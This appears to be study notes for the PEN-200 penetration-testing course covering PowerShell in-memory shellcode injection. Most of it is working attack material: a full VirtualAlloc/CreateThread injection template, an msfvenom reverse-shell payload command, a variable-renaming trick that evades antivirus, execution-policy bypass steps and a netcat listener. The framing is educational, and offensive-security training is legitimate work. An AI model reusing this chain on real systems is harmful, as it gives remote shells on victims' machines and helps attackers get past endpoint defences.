# PowerShell Thread Injection

> **PEN-200 Chapter 12 — §12.3.2.** The practical manual bypass demonstrates **in-memory shellcode execution inside the current x86 `powershell.exe` process**. This differs from remote-process injection: it uses `VirtualAlloc` and `CreateThread` locally rather than `VirtualAllocEx` and `CreateRemoteThread` against another process.

## Mental model

```text
PowerShell script
    ↓
Windows API declarations
    ↓
VirtualAlloc → allocate executable memory
    ↓
memset → copy shellcode bytes
    ↓
CreateThread → execute shellcode
    ↓
reverse shell
```

## APIs used

The chapter imports:

```text
kernel32.dll → VirtualAlloc
kernel32.dll → CreateThread
msvcrt.dll   → memset
```

Purpose:

- `VirtualAlloc` → allocate memory in the current PowerShell process.
- `memset` → write the shellcode bytes into that memory.
- `CreateThread` → execute the in-memory payload in a new thread.

## Generate PowerShell-compatible shellcode

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=443 -f powershell -v sc
```

The output provides a PowerShell byte array for `$sc`. PEN-200's payload is **x86**, so it runs it with **Windows PowerShell (x86)**. Match the shellcode architecture to the process that will execute it.

## Injection template from the chapter

Use the generated byte array in place of `<SHELLCODE_BYTES>`:

```powershell
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru
[Byte[]]$sc = <SHELLCODE_BYTES>

$size = 0x1000
if ($sc.Length -gt 0x1000) { $size = $sc.Length }

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40)
for ($i=0; $i -le ($sc.Length-1); $i++) {
    $winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)
}

$winFunc::CreateThread(0,0,$x,0,0,0)
for (;;) { Start-Sleep 60 }
```

## Static-string signature lesson

The initial script was still detected by many AV engines. PEN-200 notes that script scanners may use **static strings** such as variable names, class names, comments, and recognizable logic.

The chapter then changes names such as:

```text
Win32   → iWin32
sc      → var1
winFunc → var2
```

and the modified script is no longer flagged by the specific Avira test used in the lab.

**Exam mental model:** changing names/strings is an example of defeating a **specific static signature**, not a universal bypass. Behavioral/ML/EDR detection may still catch the technique.

## PowerShell Execution Policy

If direct script execution fails with a policy error:

```powershell
Get-ExecutionPolicy -Scope CurrentUser
```

The chapter changes the current user's policy with:

```powershell
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
```

It also notes that a script can instead be invoked with an **ExecutionPolicy Bypass** option rather than changing the user policy globally.

PowerShell Execution Policy may be controlled by one or more **Active Directory GPOs**. If so, the simple per-user change may not be enough.

## Listener

Before executing the reverse-shell script:

```bash
nc -lvnp 443
```

Then execute the script from the appropriate PowerShell architecture.

## Important limitation

Successful AV evasion does not mean the action is invisible. PEN-200 explicitly warns that machine-learning controls or a well-operated **EDR/SOC** can still detect/alert on malicious PowerShell behavior.
